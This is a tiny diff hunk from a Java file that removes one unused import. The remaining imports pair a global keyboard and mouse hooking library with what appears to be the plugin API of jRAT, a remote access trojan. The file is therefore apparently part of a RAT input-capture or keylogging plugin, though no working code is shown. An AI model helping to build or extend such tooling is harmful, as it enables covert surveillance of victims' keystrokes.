@@ -6,7 +6,6 @@ import java.io.DataOutputStream;
 import java.io.InputStreamReader;
 
 import org.jnativehook.GlobalScreen;
-import org.jnativehook.NativeHookException;
 
 import pro.jrat.api.stub.StubPlugin;
 
